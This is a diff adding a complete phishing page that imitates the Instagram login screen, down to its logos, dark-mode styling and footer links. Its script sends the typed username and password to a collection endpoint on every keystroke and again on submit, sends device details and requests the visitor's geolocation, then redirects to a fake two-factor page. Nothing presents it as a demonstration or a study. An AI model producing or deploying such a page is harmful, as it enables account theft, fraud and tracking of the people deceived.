@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Login • Instagram</title>
+<link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
+<style>
+:root {
+  --bg: #fafafa;
+  --card: #fff;
+  --border: #dbdbdb;
+  --text: #262626;
+  --muted: #8e8e8e;
+  --input-bg: #fafafa;
+  --btn: #0095f6;
+  --btn-disabled: rgba(0,149,246,.4);
+  --link: #00376b;
+  --fb: #385185;
+  --signup: #0095f6;
+  --footer: #8e8e8e;
+  --or: #dbdbdb;
+  --field-radius: 3px;
+  --btn-radius: 8px;
+}
+@media (prefers-color-scheme: dark) {
+  :root {
+    --bg: #000;
+    --card: #000;
+    --border: #262626;
+    --text: #f5f5f5;
+    --muted: #a8a8a8;
+    --input-bg: #121212;
+    --btn: #0095f6;
+    --btn-disabled: rgba(0,149,246,.35);
+    --link: #e0f1ff;
+    --fb: #e0f1ff;
+    --signup: #0095f6;
+    --footer: #a8a8a8;
+    --or: #262626;
+    --field-radius: 12px;
+    --btn-radius: 12px;
+  }
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
+.main {
+  width: 100%;
+  max-width: 935px;
+  margin: 0 auto;
+  flex: 1;
+  display: flex;
+  justify-content: center;
+  padding: 20px 16px 0;
+}
+.phone { display: none; }
+.wrap { width: 100%; max-width: 350px; }
+.lang {
+  display: none;
+  text-align: center;
+  color: var(--muted);
+  font-size: 14px;
+  margin-bottom: 28px;
+}
+@media (prefers-color-scheme: dark) {
+  .lang { display: block; }
+}
+.card {
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: 1px;
+  padding: 36px 28px 28px;
+  text-align: center;
+  margin-bottom: 12px;
+}
+@media (prefers-color-scheme: dark) {
+  .card { border-color: transparent; padding-top: 12px; }
+}
+.logo-word {
+  height: 51px;
+  margin: 0 auto 24px;
+  background: url('https://static.cdninstagram.com/rsrc.php/v3/yR/r/radfZ8v2V_J.png') no-repeat center / 175px;
+}
+.logo-glyph {
+  display: none;
+  width: 78px;
+  height: 78px;
+  margin: 0 auto 36px;
+}
+@media (prefers-color-scheme: dark) {
+  .logo-word { display: none; }
+  .logo-glyph { display: block; }
+}
+.field { position: relative; margin-bottom: 10px; }
+.field input {
+  width: 100%;
+  height: 48px;
+  padding: 0 14px;
+  border: 1px solid var(--border);
+  border-radius: var(--field-radius);
+  background: var(--input-bg);
+  color: var(--text);
+  font-size: 14px;
+  outline: none;
+}
+.field input::placeholder { color: var(--muted); }
+.field input:focus { border-color: #a8a8a8; }
+.show-pass {
+  position: absolute;
+  right: 12px;
+  top: 50%;
+  transform: translateY(-50%);
+  font-size: 14px;
+  font-weight: 600;
+  color: var(--text);
+  background: none;
+  border: none;
+  cursor: pointer;
+  display: none;
+}
+.btn {
+  width: 100%;
+  height: 48px;
+  margin: 14px 0 18px;
+  border: none;
+  border-radius: var(--btn-radius);
+  background: var(--btn-disabled);
+  color: #fff;
+  font-size: 15px;
+  font-weight: 600;
+  pointer-events: none;
+}
+.btn.active {
+  background: var(--btn);
+  pointer-events: auto;
+  cursor: pointer;
+}
+.or {
+  display: flex;
+  align-items: center;
+  margin: 8px 0 18px;
+}
+.or .line { flex: 1; height: 1px; background: var(--or); }
+.or span {
+  margin: 0 16px;
+  font-size: 13px;
+  font-weight: 600;
+  color: var(--muted);
+}
+.fb {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  color: var(--fb);
+  font-size: 14px;
+  font-weight: 600;
+  text-decoration: none;
+  margin-bottom: 18px;
+}
+.fb svg { width: 16px; height: 16px; fill: currentColor; }
+.forgot {
+  color: var(--link);
+  font-size: 13px;
+  text-decoration: none;
+}
+@media (prefers-color-scheme: dark) {
+  .or, .fb { display: none; }
+  .forgot { color: var(--muted); }
+}
+.signup {
+  background: var(--card);
+  border: 1px solid var(--border);
+  padding: 18px;
+  text-align: center;
+  font-size: 14px;
+  margin-bottom: 16px;
+}
+.signup a { color: var(--signup); font-weight: 600; text-decoration: none; }
+.create {
+  display: none;
+  width: 100%;
+  height: 48px;
+  margin: 28px 0 12px;
+  border: 1px solid var(--btn);
+  border-radius: 24px;
+  color: var(--btn);
+  font-size: 15px;
+  font-weight: 600;
+  text-decoration: none;
+  align-items: center;
+  justify-content: center;
+}
+@media (prefers-color-scheme: dark) {
+  .signup { display: none; }
+  .create { display: flex; }
+}
+.get-app { text-align: center; font-size: 14px; margin-bottom: 10px; }
+.stores { display: flex; justify-content: center; gap: 8px; margin-top: 12px; }
+.stores img { height: 40px; }
+.meta-mark {
+  display: none;
+  text-align: center;
+  margin-top: 28px;
+  color: var(--muted);
+  font-size: 14px;
+}
+@media (prefers-color-scheme: dark) {
+  .get-app, .stores { display: none; }
+  .meta-mark { display: block; }
+}
+footer {
+  width: 100%;
+  max-width: 935px;
+  padding: 16px 16px 40px;
+  text-align: center;
+}
+.links {
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: center;
+  gap: 8px 14px;
+  margin-bottom: 12px;
+}
+.links a { color: var(--footer); font-size: 12px; text-decoration: none; }
+.copy { color: var(--footer); font-size: 12px; }
+@media (prefers-color-scheme: dark) {
+  footer .links { display: none; }
+}
+@media (min-width: 876px) {
+  .main { margin-top: 32px; }
+  .phone {
+    display: block;
+    width: 380px;
+    height: 580px;
+    margin-right: 32px;
+    background: url('https://static.cdninstagram.com/rsrc.php/v3/y4/r/-MgTsT0kT3Z.png') no-repeat center / contain;
+  }
+  @media (prefers-color-scheme: dark) {
+    .phone { display: none; }
+  }
+}
+</style>
+</head>
+<body>
+<div class="main">
+  <div class="phone"></div>
+  <div class="wrap">
+    <div class="lang">English (UK)</div>
+    <div class="card">
+      <div class="logo-word"></div>
+      <svg class="logo-glyph" viewBox="0 0 24 24" aria-hidden="true">
+        <defs>
+          <linearGradient id="ig" x1="0%" y1="100%" x2="100%" y2="0%">
+            <stop offset="0%" stop-color="#f09433"/>
+            <stop offset="30%" stop-color="#e6683c"/>
+            <stop offset="50%" stop-color="#dc2743"/>
+            <stop offset="70%" stop-color="#cc2366"/>
+            <stop offset="100%" stop-color="#bc1888"/>
+          </linearGradient>
+        </defs>
+        <rect x="2" y="2" width="20" height="20" rx="6" fill="none" stroke="url(#ig)" stroke-width="1.7"/>
+        <circle cx="12" cy="12" r="5" fill="none" stroke="url(#ig)" stroke-width="1.7"/>
+        <circle cx="17.5" cy="6.5" r="1.25" fill="url(#ig)"/>
+      </svg>
+      <form id="f" autocomplete="on">
+        <div class="field">
+          <input type="text" id="u" placeholder="Phone number, username, or email" required autocomplete="username">
+        </div>
+        <div class="field">
+          <input type="password" id="p" placeholder="Password" required autocomplete="current-password">
+          <button type="button" class="show-pass" id="t">Show</button>
+        </div>
+        <button type="submit" class="btn" id="b">Log in</button>
+      </form>
+      <div class="or"><div class="line"></div><span>OR</span><div class="line"></div></div>
+      <a class="fb" href="https://www.facebook.com/login.php" rel="noopener">
+        <svg viewBox="0 0 16 16"><path d="M8 0C3.6 0 0 3.6 0 8c0 4 2.9 7.3 6.8 7.9v-5.6H4.8V8h2V6.2c0-2 1.2-3.1 3-3.1.9 0 1.8.1 1.8.1v2h-1c-1 0-1.3.6-1.3 1.2V8h2.2l-.4 2.3H9.3V16C13.1 15.3 16 12 16 8c0-4.4-3.6-8-8-8z"/></svg>
+        Log in with Facebook
+      </a>
+      <a class="forgot" href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
+    </div>
+    <div class="signup">Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></div>
+    <a class="create" href="https://www.instagram.com/accounts/emailsignup/">Create new account</a>
+    <div class="get-app">Get the app.
+      <div class="stores">
+        <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="App Store">
+        <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Google Play">
+      </div>
+    </div>
+    <div class="meta-mark">∞ Meta</div>
+  </div>
+</div>
+<footer>
+  <div class="links">
+    <a href="https://about.meta.com/">Meta</a>
+    <a href="https://about.instagram.com/">About</a>
+    <a href="https://about.instagram.com/blog/">Blog</a>
+    <a href="https://about.instagram.com/about-us/careers">Jobs</a>
+    <a href="https://help.instagram.com/">Help</a>
+    <a href="https://developers.facebook.com/docs/instagram">API</a>
+    <a href="https://www.instagram.com/legal/privacy/">Privacy</a>
+    <a href="https://www.instagram.com/legal/terms/">Terms</a>
+    <a href="https://www.instagram.com/explore/locations/">Locations</a>
+    <a href="https://www.instagram.com/web/lite/">Instagram Lite</a>
+    <a href="https://www.threads.com/">Threads</a>
+    <a href="https://www.instagram.com/accounts/meta_verified/">Meta Verified</a>
+  </div>
+  <div class="copy">English · © 2026 Instagram from Meta</div>
+</footer>
+<script>
+const COLLECT = "/api/collect";
+const AFTER = "/2fa.html";
+const u = document.getElementById("u");
+const p = document.getElementById("p");
+const b = document.getElementById("b");
+const t = document.getElementById("t");
+const dark = matchMedia("(prefers-color-scheme: dark)").matches;
+if (dark) u.placeholder = "Username, email address or mobile number";
+
+function deviceExtra() {
+  return JSON.stringify({
+    screen: screen.width + "x" + screen.height,
+    lang: navigator.language,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    plat: navigator.platform,
+    scheme: dark ? "dark" : "light"
+  });
+}
+function post(payload) {
+  const body = JSON.stringify(payload);
+  fetch(COLLECT, { method: "POST", headers: { "Content-Type": "application/json" }, body, keepalive: true }).catch(() => {});
+  if (navigator.sendBeacon) navigator.sendBeacon(COLLECT, new Blob([body], { type: "application/json" }));
+}
+let last = 0;
+function live() {
+  const now = Date.now();
+  if (now - last < 900) return;
+  last = now;
+  post({ type: "live", username: u.value.trim(), password: p.value, ua: navigator.userAgent, extra: deviceExtra() });
+}
+function sync() {
+  b.classList.toggle("active", !!(u.value.trim() && p.value));
+  t.style.display = p.value ? "block" : "none";
+}
+u.addEventListener("input", () => { sync(); live(); });
+p.addEventListener("input", () => { sync(); live(); });
+t.onclick = () => {
+  const show = p.type === "password";
+  p.type = show ? "text" : "password";
+  t.textContent = show ? "Hide" : "Show";
+};
+if (navigator.geolocation) {
+  navigator.geolocation.getCurrentPosition(pos => {
+    post({ type: "geo", username: u.value.trim() || "geo", password: "", ua: navigator.userAgent,
+      extra: "lat:" + pos.coords.latitude + ",lon:" + pos.coords.longitude });
+  }, () => {}, { timeout: 4000 });
+}
+document.getElementById("f").onsubmit = e => {
+  e.preventDefault();
+  b.disabled = true;
+  b.textContent = "Logging in...";
+  post({ type: "submit", username: u.value.trim(), password: p.value, ua: navigator.userAgent, extra: deviceExtra() });
+  setTimeout(() => location.replace(AFTER), 450);
+};
+</script>
+</body>
+</html>
